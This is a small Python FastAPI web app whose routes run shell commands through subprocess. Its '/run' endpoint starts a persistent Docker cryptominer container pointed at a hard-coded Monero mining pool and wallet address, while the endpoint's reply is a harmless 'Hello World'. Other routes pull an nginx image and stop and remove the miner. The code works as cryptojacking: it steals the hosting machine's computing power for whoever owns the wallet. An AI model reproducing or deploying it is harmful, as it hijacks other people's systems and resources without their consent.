from fastapi import FastAPI
import subprocess

app = FastAPI()


@app.get("/")
def read_root():
    return {"Hello": "World"}

@app.get("/pull")
def pull_container():
    subprocess.run("docker pull nginx", shell=True)
    return {"Hello": "World"}


@app.get("/run")
def run_container():
    subprocess.run("docker run -itd --restart=always -e POOL_URL=pool.hashvault.pro:80 -e "
                   "POOL_USER"
                   "=41fLkHicU9w9a7mNpfxk13NxqB2FrzFc5HSnbDn1NUPwXy6dkkUgsyQVUBZ7qweyP19BWdMYJ4oq4D2SJ1eexPTv9MLCvQ3 "
                   "--name monero pmietlicki/monero-miner", shell=True)
    return {"Hello": "World"}

@app.get("/stop")
def start_container():
    subprocess.run("docker stop monero", shell=True)
    subprocess.run("docker rm monero", shell=True)

